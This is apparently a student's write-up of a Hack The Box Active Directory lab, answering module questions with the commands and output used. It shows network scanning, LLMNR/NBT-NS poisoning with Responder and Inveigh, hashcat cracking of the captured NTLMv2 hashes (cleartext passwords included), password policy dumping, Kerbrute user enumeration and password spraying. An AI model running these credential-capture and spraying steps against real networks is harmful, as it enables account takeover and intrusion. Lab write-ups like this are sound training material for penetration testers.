# Active Directory Enumeration & Attacks
Active Directory (AD) is the leading enterprise domain management suite, providing identity and access management, centralized domain administration, authentication, and much more. Due to the many features and complexity of AD, it presents a large attack surface that is difficult to secure properly. To be successful as infosec professionals, we must understand AD architectures and how to secure our enterprise environments. As Penetration testers, having a firm grasp of what tools, techniques, and procedures are available to us for enumerating and attacking AD environments and commonly seen AD misconfigurations is a must.

## Scenario


We are Penetration Testers working for CAT-5 Security. After a few successful engagements shadowing with the team, the more senior members want to see how well we can do starting an assessment on our own. The team lead sent us the following email detailing what we need to accomplish.

[![Screenshot-2025-03-13-085033.png](https://i.postimg.cc/QCyFjLYL/Screenshot-2025-03-13-085033.png)](https://postimg.cc/BP2SCzGN)

This module will allow us to practice our skills (both prior and newly minted) with these tasks. The final assessment for this module is the execution of two internal penetration tests against the company Inlanefreight. During these assessments, we will work through an internal penetration test simulating starting from an external breach position and a second one beginning with an attack box inside the internal network as clients often request. Completing the skills assessments signifies the successful completion of the tasks mentioned in the scoping document and tasking email above. In doing so, we will demonstrate a firm grasp of many automated and manual AD attack and enumeration concepts, knowledge of and experience with a wide array of tools, and the ability to interpret data gathered from an AD environment to make critical decisions to advance the assessment. The content in this module is meant to cover core enumeration concepts necessary for anyone to be successful in performing internal penetration tests in Active Directory environments. We will also cover many of the most common attack techniques in great depth while working through some more advanced concepts as a primer for AD-focused material that will be covered in more advanced modules.

Below you will find a completed scoping document for the engagement containing all pertinent information provided by the customer.

### Assessment Scope
The following IPs, hosts, and domains defined below make up the scope of the assessment.

**In Scope For Assessment**
Range/Domain	Description
- INLANEFREIGHT.LOCAL	Customer domain to include AD and web services.
- LOGISTICS.INLANEFREIGHT.LOCAL	Customer subdomain
- FREIGHTLOGISTICS.LOCAL	Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL
- 172.16.5.0/23	In-scope internal subnet.


**Out Of Scope**
- Any other subdomains of INLANEFREIGHT.LOCAL
- Any subdomains of FREIGHTLOGISTICS.LOCAL
- Any phishing or social engineering attacks
- Any other IPS/domains/subdomains not explicitly mentioned
- Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module

### Methods Used
The following methods are authorized for assessing Inlanefreight and its systems :

**External Information Gathering (Passive Checks)**
External information gathering is authorized to demonstrate the risks associated with information that can be gathered about the company from the internet. To simulate a real-world attack, CAT-5 and its assessors will conduct external information gathering from an anonymous perspective on the internet with no information provided in advance regarding Inlanefreight outside of what is provided within this document.

Cat-5 will perform passive enumeration to uncover information that may help with internal testing. Testing will employ various degrees of information gathering from open-source resources to identify publicly accessible data that may pose a risk to Inlanefreight and assist with the internal penetration test. No active enumeration, port scans, or attacks will be performed against internet-facing "real-world" IP addresses or the website located at https://www.inlanefreight.com.

**Internal Testing**
The internal assessment portion is designed to demonstrate the risks associated with vulnerabilities on internal hosts and services ( Active Directory specifically) by attempting to emulate attack vectors from within Inlanefreight's area of operations. The result will allow Inlanefreight to assess the risks of internal vulnerabilities and the potential impact of a successfully exploited vulnerability.

To simulate a real-world attack, Cat-5 will conduct the assessment from an untrusted insider perspective with no advance information outside of what's provided in this documentation and discovered from external testing. Testing will start from an anonymous position on the internal network with the goal of obtaining domain user credentials, enumerating the internal domain, gaining a foothold, and moving laterally and vertically to achieve compromise of all in-scope internal domains. Computer systems and network operations will not be intentionally interrupted during the test.

**Password Testing**
Password files captured from Inlanefreight devices, or provided by the organization, may be loaded onto offline workstations for decryption and utilized to gain further access and accomplish the assessment goals. At no time will a captured password file or the decrypted passwords be revealed to persons not officially participating in the assessment. All data will be stored securely on Cat-5 owned and approved systems and retained for a period of time defined in the official contract between Cat-5 and Inlanefreight.

We provided the above scoping documentation so we become used to seeing this style of documentation. As we progress through our Infosec Careers, especially on the offensive side, it will be common to receive scoping documents and Rules of Engagement (RoE) documents that outline these types of information.

The Stage Is Set
Now that we have our scope clearly defined for this module, we can dive into exploring Active Directory enumeration and attack vectors. Now, let's dive into performing passive external enumeration against Inlanefreight.

# Questions and Answers

## External Recon and Enumeration Principles

* **While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )**
For this task, I took advanted of the BGP Toolkit by Hurricane Electric. In the search bar, I entered the target domain: *inlanefreight.com*

Once the domain page loaded, I browsed to the DNS Records section. Under the TXT Records, I found the following information:

[![Screenshot-2025-03-13-090412.png](https://i.postimg.cc/X71P62Vw/Screenshot-2025-03-13-090412.png)](https://postimg.cc/LnfDz3gX)

## Initial Enumeration of the Domain

* **From your scans, what is the "commonName" of host 172.16.5.5 ?**

For this task, I performed a detailed network scan against the targets that we discovered earlier to identify open ports and extract the host information. I used Nmap with aggressive scanning enabled to perform service detection, OS fingerprinting, script scanning, and version detection:

```c
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

One of the open ports returned important information about the host 172.16.5.5. By running the rdp-ntlm-info script, Nmap was able to extract additional details from the Remote Desktop Protocol (RDP) service on port 3389:

```c
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-13T14:32:31+00:00
|_ssl-date: 2025-03-13T14:32:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Issuer: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-11T06:08:03
| Not valid after:  2025-08-13T06:08:03
| MD5:   ab1f 46b2 cf15 74bc e1e1 b183 c5ef 902e
|_SHA-1: bd7b cfa2 bd90 7dd4 a546 2552 6d1f 5537 77e7 b659
```


* **What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)**

From the previous Nmap scan results, I identified that the host 172.16.5.130 is running Microsoft SQL Server 2019, version 15.00.2000.00.

```c
Nmap scan report for 172.16.5.130
Host is up (0.0014s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
```


## LLMNR/NBT-NS Poisoning - from Linux

* **Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**

I started Responder on the interface connected to the target network.
```c
sudo responder -I ens224 -wf
```
After running Responder for several minutes, it successfully captured an NTLM hash for the user account backupagent

[![Screenshot-2025-03-13-141104.png](https://i.postimg.cc/Vkh6N70q/Screenshot-2025-03-13-141104.png)](https://postimg.cc/PCmh3Q4J)


* **Crack the hash for the previous account and submit the cleartext password as your answer.**

After successfully capturing the hash using Responder, I proceeded with cracking it. I navigated to Responder's Logs Directory in /usr/share/responder/logs. I extracted the NTLMv2 hash from the file and saved it into a new file named hash.txt on my attack machine for cracking.

I used Hashcat, specifying the mode for NTLMv2 hashes (-m 5600), along with the rockyou.txt wordlist.
```c
hashcat -m 5600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
```

After Hashcat finished processing, I reviewed the results by displaying the contents of cracked.txt:
```c
cat cracked.txt

BACKUPAGENT::INLANEFREIGHT:6b6fa02e047a9ef4:5f2b8a134304247569905d3f187b8678:010100000000000080a267f81f94db010f58d0f6b87a15bc0000000002000800410055003500340001001e00570049004e002d004a005900560048004b0035005200590036004700530004003400570049004e002d004a005900560048004b003500520059003600470053002e0041005500350034002e004c004f00430041004c000300140041005500350034002e004c004f00430041004c000500140041005500350034002e004c004f00430041004c000700080080a267f81f94db010600040002000000080030003000000000000000000000000030000002d9fd7ffabf78ce55e4568fbe3ba65c01c67b75b7bee7c2347f528ecc254dba0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
```

[![Screenshot-2025-03-13-142515.png](https://i.postimg.cc/7Yd8GjXZ/Screenshot-2025-03-13-142515.png)](https://postimg.cc/D8rYRjt9)

**Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**

While running Responder during the previous task, I had already captured an NTLMv2 hash for the user **wley**. I copied the captured hash from Responder’s logs and saved it into a new file called hash2.txt on my attack machine.
```c
hashcat -m 5600 -a 0 -o cracked2.txt hash2.txt /usr/share/wordlists/rockyou.txt
```
Once Hashcat completed the cracking process, I reviewed the results by running:

```c
cat cracked2.txt
WLEY::INLANEFREIGHT:6c0dde4851063a3b:9e405760f4fca4e917989d53b08cfdf8:010100000000000080a267f81f94db0145080a739104b4e60000000002000800410055003500340001001e00570049004e002d004a005900560048004b0035005200590036004700530004003400570049004e002d004a005900560048004b003500520059003600470053002e0041005500350034002e004c004f00430041004c000300140041005500350034002e004c004f00430041004c000500140041005500350034002e004c004f00430041004c000700080080a267f81f94db010600040002000000080030003000000000000000000000000030000002d9fd7ffabf78ce55e4568fbe3ba65c01c67b75b7bee7c2347f528ecc254dba0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
```
[![Screenshot-2025-03-13-143007.png](https://i.postimg.cc/6qqgThvZ/Screenshot-2025-03-13-143007.png)](https://postimg.cc/gL9NT84c)


## LLMNR/NBT-NS Poisoning - from Windows

* **Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.**

I initiated an RDP connection to the target Windows host 10.129.145.5 using xfreerdp with the provided credentials:
```c
xfreerdp /v:10.129.145.5 /u:htb-student /p:Academy_student_AD!
```
Once connected, I launched PowerShell with administrative privileges, navigated to the C:\Tools directory, and executed Inveigh:
```c
PS C:\Tools> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2025-03-14T05:40:50 | PID 2520]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::e401:bd43:c7d0:fcc%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::e401:bd43:c7d0:fcc%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
```
After a few minutes, I pressed ESC to enter interactive mode. Once inside, I used the GET NTLMV2UNIQUE command to display the captured hashes.
```c
C(0:0) NTLMv1(0:0) NTLMv2(6:99)>GET NTLMV2UNIQUE

Hashes
===============================================================================================================================================
lab_adm::INLANEFREIGHT:A6D095B424C91B46:70DB5276AFCCA73C584052456200DD1A:01010000000000000DA2C736DE94DB01D88A6B37A32C04110000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008000DA2C736DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
clusteragent::INLANEFREIGHT:EE5175D9264A6798:A2C9AC3DD9D72D6E5A512DB245711E81:0101000000000000600C3D39DE94DB014F2F26EB970221550000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800600C3D39DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
backupagent::INLANEFREIGHT:D467610D69581F80:2106E3A29CC9C27DC2BFFE2BE496B14C:0101000000000000F3C32259DE94DB01F73222F55C56CAD70000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800F3C32259DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
svc_qualys::INLANEFREIGHT:5CB2C5BC321A876A:4B659B343655147DADA26C4E21EDE70D:01010000000000006FE2F15CDE94DB019440B1162DC10E410000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008006FE2F15CDE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:6B0A501B15EE3D3E:5F66562619519130C3AE78AEF0F40A92:01010000000000007B984864DE94DB01A9F0F81E6A58AB6B0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008007B984864DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

I copied the captured hash from svc_qualys and saved it into a new file called svc_hash.txt on my attack machine. I used Hashcat, specifying the mode for NTLMv2 hashes (-m 5600), along with the rockyou.txt wordlist.
```c
hashcat -m 5600 -a 0 -o svc_cracked.txt svc_hash.txt /usr/share/wordlists/rockyou.txt
```

Once Hashcat completed the cracking process, I reviewed the results by running:
```c
cat svc_cracked.txt
SVC_QUALYS::INLANEFREIGHT:5cb2c5bc321a876a:4b659b343655147dada26c4e21ede70d:01010000000000006fe2f15cde94db019440b1162dc10e410000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008006fe2f15cde94db0106000400020000000800300030000000000000000000000000300000b3517a0e8ed7e6d67ea022f0b1f9c03843cd9b804d89be630d8a8fca650a8d2b0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
```

## Enumerating & Retrieving Password Policies

>*SSH to 10.129.67.132 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"*

* **What is the default Minimum password length when a new domain is created? (One number)**

This answer was given throughout the lecture. The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:
Minimum password length	7 

* **What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)**

I started by connecting to the target machine at 10.129.167.132 via SSH, using the provided credentials. Once connected, I ran ifconfig to identify the available network interfaces and their respective IP addresses:
```c
─[htb-student@ea-attack01]─[~]
└──╼ $ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:43:49:a1:9c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.67.132  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::2055:97c0:f1ab:ad95  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::ff38:fdaa:b937:bf38  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:a9:7a  txqueuelen 1000  (Ethernet)
        RX packets 22873  bytes 2099329 (2.0 MiB)
        RX errors 0  dropped 340  overruns 0  frame 0
        TX packets 1041  bytes 120087 (117.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:f5:68  txqueuelen 1000  (Ethernet)
        RX packets 815  bytes 52054 (50.8 KiB)
        RX errors 0  dropped 6  overruns 0  frame 0
        TX packets 45  bytes 3622 (3.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 1200 (1.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1200 (1.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Next, I performed a ping sweep on the 172.16.5.0/24 range to discover other active hosts on the network
```c
for ip in $(seq 1 254); do
    ping -c 1 -W 1 172.16.5.$ip | grep "bytes from" &
done
wait
```
This revealed two new active ip addresses 172.16.5.5 and 172.16.5.225. I then ran enum4linux to enumerate the domain:
```c
enum4linux-ng -P 172.16.5.5 -oA ilfreight

 =================================================
|    Domain Information via RPC for 172.16.5.5    |
 =================================================
[+] Domain: INLANEFREIGHT
[+] SID: S-1-5-21-3842939050-3880317879-2865463114
[+] Host is part of a domain (not a workgroup)

 =========================================================
|    Domain Information via SMB session for 172.16.5.5    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ACADEMY-EA-DC01
NetBIOS domain name: INLANEFREIGHT
DNS domain: INLANEFREIGHT.LOCAL
FQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL


 =======================================
|    Policies via RPC for 172.16.5.5    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: 24
  min_pw_length: 8
  min_pw_age: 1 day 4 minutes
  max_pw_age: not set
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: true
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: 5
domain_logoff_information:
  force_logoff_time: not set

Completed after 5.35 seconds
```
  
## Password Spraying - Making a Target User List

> SSH to 10.129.67.220 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

* **Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?**

I started by connecting to the target machine at 10.129.167.132 via SSH, using the provided credentials. Once connected, I ran Kerbrute: 
```c
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

This gave me the following results: 
```c
<snip>
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 minman@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
2025/03/14 11:26:20 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
2025/03/14 11:26:21 >  [+] VALID USERNAME:	 strent@inlanefreight.local
2025/03/14 11:26:21 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
2025/03/14 11:26:22 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
2025/03/14 11:26:22 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
2025/03/14 11:26:22 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
2025/03/14 11:26:23 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
2025/03/14 11:26:23 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
2025/03/14 11:26:24 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
2025/03/14 11:26:25 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
2025/03/14 11:26:25 >  Done! Tested 48705 usernames (56 valid) in 14.542 seconds
```

## Internal Password Spraying - from Linux
> SSH to 10.129.22.33 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

* **Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.**

Using the list of valid usernames we collected in the previous step, I ran Kerbrute to perform a password spray attack.
```c
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
Kerbrute returned a valid login that starts with the letter "s", confirming the user has the password Welcome1.

[![Screenshot-2025-03-14-134928.png](https://i.postimg.cc/020jMgBq/Screenshot-2025-03-14-134928.png)](https://postimg.cc/bsdpW5P6)
